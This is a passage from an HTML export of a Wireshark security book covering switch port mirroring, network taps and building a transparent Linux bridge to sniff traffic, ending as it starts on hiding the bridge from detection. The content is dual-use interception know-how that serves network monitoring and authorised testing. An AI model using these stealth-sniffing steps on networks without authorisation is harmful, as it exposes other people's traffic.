or Juniper network hardware. Their syntax is similar to Cisco, but there are small differences as well as completely different terms for the same features.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following statements enable port mirroring on an HP switch:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Procurve(config)# mirror-port 6</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:265.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Procurve(config)# interface 2 Procurve(eth-2)# monitor Procurve(eth-2)# exit Procurve(config)#</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.5500pt;margin-right:6.3500pt;" ><a name="_bookmark292" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this case, port 6 is the port where monitored traffic is duplicated. You can specify the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >monitor </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >keyword for multiple interfaces. All the traffic will be sent to the mirror port. In the switch we used for testing, it was impossible to specify only capturing sent or received packets.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can show the current monitoring configuration by executing:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Procurve# show monitor</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section152" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The output will show both a list of ports being monitored as well as the interface the packets are being mirrored to.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.7500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Remote Spanning</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:10.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Sometimes the person responsible for analyzing spanned traffic is unable to have the monitoring device directly off of the spanned port. In another case, a person might want to monitor spanned ports on more than one switch. In both cases, you just need to use remote spanning. Remote spanning allows you to monitor a switch port from a device on another switch port. And you can set up remote spanning to span ports from multiple switches. In both cases, the spanned traffic gets sent to the destination switch port (typically over a dedicated VLAN to isolate the traffic and prevent possible collision or loop issues). The monitoring device is expected at the destination</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >port.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Network Taps</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Network taps are devices dedicated to capturing traffic on a network. They are available for different types of networks and/or cables used. A lot of network taps are passive devices, meaning they perform the capture without any software or intelligence by making a bypass connection to the RX wire pair, for example.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Because you are tapping into a network line and not as a connected device, there might be some confusion about the direction of traffic. Be assured that, even when connected only to the RX wire pair, you are still capturing traffic intended for all. The bits are still traveling on the wire, regardless of what originating device&#8217;s traffic you are capturing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:0.1500pt;margin-right:28.3000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you choose to aggregate traffic, then also be mindful of how</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >much traffic you&#8217;re receiving. If your tap is more than 50% utilized, you&#8217;re likely dropping</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Unlike SPAN ports, taps can capture network traffic at 100% utilization very well. This is in part due to the fact that a tap does not change in the operation of the network (aside from the fact that it leaks traffic to someone other than the intended recipient).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><a name="_bookmark293" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A tap generally does not combine the mirrored traffic into one port for easy sniffing. It merely replicates incoming traffic on both of the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section153" ><p class=MsoBodyText  align=justify  style="margin-top:3.8000pt;margin-right:18.8500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interfaces to separate monitoring ports. In order to capture all traffic on a tapped link, you need two sniffing interfaces on your</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >monitoring workstation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are a few advantages to using taps compared to other methods of capturing network traffic. Because most taps are passive devices, it is unlikely they will disrupt network connectivity because of hardware failure. For the same reason, they are completely invisible on the network. They do not participate on the network, so they cannot be detected or change its behavior, except on negligible physical levels (for example, degrading signal quality).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Most passive network taps degrade the connection to 100BASE-TX on purpose because a passive device cannot tap a 1000BASE-T connection. This is due to the fact that it uses all four wire pairs and auto-negotiates a clock source. A passive tap might allow two devices to continue operating on 1000BASE-T but would not be able to sniff the packets because it would be unaware of the clock source. Active switches solve this problem and allow you to capture up to 10GBASE- T, while keeping the redundancy features that do not interrupt the connection when the device fails.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For the reasons just mentioned, taps are useful for applications like intrusion detection systems and similar monitoring, where the traffic only needs to be read.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Professional-Grade Taps</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:7.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >An enterprise-level network tap is an expensive network device that can be rack mounted most of the time, just like any other high- capacity network device. This makes these types of taps a good fit for permanent sniffing solutions as might be needed for an IDS. These taps can often be configured dynamically, and most claim not to interrupt the tapped connection in the event of device or power failure.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The use of these taps as well as an overview of the types available is out of the scope of this book. Suffice to say that these devices are available in all types and flavors for every physical network media in use in modern networks.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section154" ><h4 style="margin-top:3.4000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Throwing Star LAN Taps</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The throwing star is a popular LAN tap available either in kit form to assemble yourself or as an assembled device. It is completely passive and quite inexpensive. It is primarily used by enthusiasts and is a common addition to the pentester&#8217;s kit bag.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As shown in<a name="_bookmark295" ></a>&nbsp;</span><span><a href="#_bookmark296" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-14</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the throwing star is a portable device, so there is no excuse for not keeping it in your set of default equipment. Like the other types of passive Ethernet taps, the throwing star splits the Rx and Tx traffic to separate <a name="_bookmark294" ></a>Ethernet cables. It also uses its circuitry to force the speed to auto-negotiate to 100 Mbps in order for the wiring to be correct, as described earlier in this section.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="416.25"  height="0" ></td></tr><tr><td></td><td><img width="188"  height="164"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker201276.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark296" ></a><span><a href="#_bookmark295" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-14:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Throwing star LAN tap</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.7500pt;margin-right:0.0000pt;margin-left:26.7500pt;text-indent:0.0000pt;text-align:left;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-style:italic;font-size:12.5000pt;" >Source</span></i><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:12.5000pt;" >: Great Scott Designs</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Transparent Linux Bridges</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you own a machine capable of running Linux with two or more network interfaces, you can transform it into a powerful networking tool. This section shows you the basics of Linux bridges and how to sniff traffic with them.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:14.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Using a bridge is very versatile because you can use packet filtering provided by the operating system. This allows you to block certain traffic or even change packets and redirect them to a malicious destination, which is covered in </span><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >when dealing with man-in- the-middle attacks.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="115"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker201946.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section155" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:197.0000px;" ><img width="763"  height="197"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker201974.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><h4 style="margin-top:4.5500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Sniffing on a Linux Bridge</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Linux bridge support is built into the Kernel, but to start using it</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >you need to install the support utilities. For Debian/Ubuntu-based systems, install the package</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bridge-utils</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost# apt-get install</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bridge-utils</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >And do the following for Red-Hat based systems:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost# yum install bridge-utils</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After installing the bridging utilities, yo can manage bridges by using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >brctl </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command. This command allows you to add a bridge with the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >addbr</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command, which appears as an extra interface. Then you use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >addif </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >delif<a name="_bookmark297" ></a>&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >commands to add interfaces to the bridge. If the interfaces are up and in promiscuous mode, packets will be forwarded between the interfaces.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To create a bridge named </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >testbr </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >using eth1 and eth2 of your machine, use the following commands:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1000pt;margin-right:145.3500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@pickaxe:~# brctl addbr testbr root@pickaxe:~# brctl addif testbr eth1 root@pickaxe:~# brctl addif testbr eth2 root@pickaxe:~# ifconfig eth1 up promiscuous root@pickaxe:~# ifconfig eth2 up promiscuous root@pickaxe:~# ifconfig testbr up</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.4000pt;margin-right:10.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Packets should now be forwarded from one interface to the other. This also means that the packets being processed by your machine can now be sniffed. All you have to do is set up Wireshark to listen on the bridge with a device directly attached to it, and it will receive every packet that passes through.<a name="_bookmark298" ></a>&nbsp;</span><span><a href="#_bookmark299" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-15</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >illustrates the flow of traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section156" ><p class=MsoBodyText  style="margin-left:152.0000pt;" ><img width="302"  height="272"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker203398.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark299" ></a><span><a href="#_bookmark298" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-15:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Traffic flow when sniffing a Linux bridge</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Hiding the Bridge</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the default configuration, a Linux bridge is not the stealthiest of options. A number of issues might negatively affect the network you are sniffing, contaminate your traffic samples, or give away your presence. This section highlights some of the troubles you might encounter while trying to sniff using a transparent Linux bridge.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Linux bridges support Spanning Tree Protocol (STP). STP uses Bridge Protocol Data Unit (BPDU) packets to detect loops in the network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >BPDU packets can be thought of as scouts sent to detect anomalies, particularly loops, in the topology. Loops in a network are very bad because broadcast packets can propagate around and get re-sent, cascading into a network-crippling broadcast storm. BPDU packets that detect a loop will instruct the STP-enabled switch to disable the offending switch port. If you connect a switch for the purpose of sniffing, <a name="_bookmark300" ></a>you generally do not want this feature, especially if you are sniffing a workstation or similar non-networking device that would not send BPDU packets in normal operation. For these reasons, you should verify that STP is disabled on your bridge.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following code snippet shows how you can check if STP is enabled and how to disable it:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@pickaxe:~# brctl show</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:58.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bridge</span><span style="mso-spacerun:'yes';font-family:'Courier 